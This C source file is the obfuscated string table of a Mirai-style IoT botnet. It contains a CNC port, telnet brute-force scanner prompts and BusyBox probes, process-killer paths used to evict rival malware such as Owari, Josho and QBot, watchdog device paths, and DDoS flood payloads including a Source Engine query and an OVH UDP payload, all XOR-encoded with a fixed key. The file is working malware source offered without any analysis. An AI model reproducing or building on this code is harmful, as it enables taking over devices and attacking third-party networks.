#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xb33fd34d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x17\x04", 2); // 1302
    add_entry(TABLE_SCAN_CB_PORT, "\x37\x13", 2); // 9473

    add_entry(TABLE_EXEC_SUCCESS, "\x71\x7D\x7C\x7C\x77\x71\x66\x77\x60\x60\x7D\x60", 12);// connecterror

    add_entry(TABLE_SCAN_SHELL, "\x61\x7A\x77\x7E\x7E\x12", 6);// shell
    add_entry(TABLE_SCAN_ENABLE, "\x77\x7C\x73\x70\x7E\x77\x12", 7);// enable
    add_entry(TABLE_SCAN_SYSTEM, "\x61\x6B\x61\x66\x77\x7F\x12", 7);// system
    add_entry(TABLE_SCAN_SH, "\x61\x7A\x12", 3);// sh
    add_entry(TABLE_SCAN_QUERY, "\x3D\x70\x7B\x7C\x3D\x70\x67\x61\x6B\x70\x7D\x6A\x32\x56\x57\x5F\x5D\x5C\x41\x12", 20);// /bin/busybox DEMONS
    add_entry(TABLE_SCAN_RESP, "\x56\x57\x5F\x5D\x5C\x41\x28\x32\x73\x62\x62\x7E\x77\x66\x32\x7C\x7D\x66\x32\x74\x7D\x67\x7C\x76\x12", 25);// DEMONS: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x7C\x71\x7D\x60\x60\x77\x71\x66\x12", 9);// ncorrect
    add_entry(TABLE_SCAN_PS, "\x3D\x70\x7B\x7C\x3D\x70\x67\x61\x6B\x70\x7D\x6A\x32\x62\x61\x12", 16);// /bin/busybox ps
	add_entry(TABLE_SCAN_ASSWORD, "\x73\x61\x61\x65\x7D\x60\x76\x12", 8);// assword
	add_entry(TABLE_SCAN_OGIN, "\x7D\x75\x7B\x7C\x12", 5);// ogin
	add_entry(TABLE_SCAN_ENTER, "\x77\x7C\x66\x77\x60\x12", 6);// enter

    add_entry(TABLE_KILLER_PROC, "\x3D\x62\x60\x7D\x71\x3D\x12", 7);// /proc/
    add_entry(TABLE_KILLER_EXE, "\x3D\x77\x6A\x77\x12", 5);// /exe
    add_entry(TABLE_KILLER_FD, "\x3D\x74\x76\x12", 4);// /fd
    add_entry(TABLE_KILLER_MAPS, "\x7F\x73\x62\x61\x12", 6);// /maps
    add_entry(TABLE_KILLER_TCP, "\x3D\x62\x60\x7D\x71\x3D\x7C\x77\x66\x3D\x66\x71\x62\x12", 14);// /proc/net/tcp

    add_entry(TABLE_ATK_UDPKICK, "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", 30);
    add_entry(TABLE_ATK_VSE, "\x46\x41\x7D\x67\x60\x71\x77\x32\x57\x7C\x75\x7B\x7C\x77\x32\x43\x67\x77\x60\x6B\x12", 21);// TSource Engine Query
    add_entry(TABLE_ATK_OVH, "\x08\x1e\x77\xda", 4);// OVHUDP Payload
    add_entry(TABLE_ATK_RESOLVER, "\x3D\x77\x66\x71\x3D\x60\x77\x61\x7D\x7E\x64\x3C\x71\x7D\x7C\x74\x12", 17);// /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x7C\x73\x7F\x77\x61\x77\x60\x64\x77\x60\x12", 11);// nameserver
    
    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x3D\x76\x77\x64\x3D\x65\x73\x66\x71\x7A\x76\x7D\x75\x12", 14);// /dev/watchdog
	add_entry(TABLE_IOCTL_KEEPALIVE2, "\x3D\x76\x77\x64\x3D\x7F\x7B\x61\x71\x3D\x65\x73\x66\x71\x7A\x76\x7D\x75\x12", 19);// /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x3D\x76\x77\x64\x3D\x54\x46\x45\x56\x46\x23\x22\x23\x4D\x65\x73\x66\x71\x7A\x76\x7D\x75\x12", 23);// /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x3D\x76\x77\x64\x3D\x54\x46\x45\x56\x46\x23\x22\x23\x32\x65\x73\x66\x71\x7A\x76\x7D\x75\x12", 24);// /dev/FTWDT101\ watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE5, "\x3D\x76\x77\x64\x3D\x65\x73\x66\x71\x7A\x76\x7D\x75\x22\x12", 15);// /dev/watchdog0
    add_entry(TABLE_IOCTL_KEEPALIVE6, "\x3D\x77\x66\x71\x3D\x76\x77\x74\x73\x67\x7E\x66\x3D\x65\x73\x66\x71\x7A\x76\x7D\x75\x12", 22);// /etc/default/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE7, "\x3D\x61\x70\x7B\x7C\x3D\x65\x73\x66\x71\x7A\x76\x7D\x75\x12", 15);// /sbin/watchdog
    
    add_entry(TABLE_EXEC_MIRAI, "\x76\x64\x60\x5A\x77\x7E\x62\x77\x60\x12", 10); // "dvrHelper"
    add_entry(TABLE_EXEC_OWARI, "\x4A\x23\x2B\x5B\x20\x21\x2B\x23\x20\x26\x47\x5B\x47\x12", 14); // "X19I239124UIU"
    add_entry(TABLE_EXEC_JOSHO, "\x23\x26\x54\x73\x12", 5); // "14Fa"
	add_entry(TABLE_EXEC_ALLQBOT, "\x37\x61\x32\x37\x61\x32\x5A\x46\x46\x42\x12", 11); // "%s %s HTTP"
	add_entry(TABLE_EXEC_OGOWARI, "\x5B\x67\x4B\x75\x67\x78\x77\x5B\x63\x7C\x12", 11); // "IuYgujeIqn"
    add_entry(TABLE_EXEC_MIRAIDLR, "\x76\x7E\x60\x3C\x12", 5);// "dlr."
    add_entry(TABLE_EXEC_MIRAIARM, "\x3C\x73\x60\x7F\x12", 5);// ".arm"
    add_entry(TABLE_EXEC_MIRAIMIPS, "\x3C\x7F\x7B\x62\x61\x12", 6);// ".mips"
    add_entry(TABLE_EXEC_MIRAIMPSL, "\x3C\x7F\x62\x61\x7E\x12", 6);// ".mpsl"
    add_entry(TABLE_EXEC_X86_64, "\x3C\x6A\x2A\x24\x4D\x6A\x24\x26\x12", 9);// ".x86_64"
    add_entry(TABLE_EXEC_X86, "\x3C\x6A\x2A\x24\x12", 5);// ".x86"

    add_entry(TABLE_RANDOM, "\x42\x7E\x7E\x6B\x01\x41\x5A\x56\x08\x7B\x5B\x55\x59\x0E\x56\x7B\x75\x01\x0A\x6F\x50\x74\x62\x71\x4F\x5F\x79\x55\x62\x4C\x70\x00\x49\x6F\x42\x09\x4E\x4E\x6C\x7F\x72\x70\x72\x4C\x60\x71\x01\x4A\x75\x01\x55\x08\x00\x68\x38", 55);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

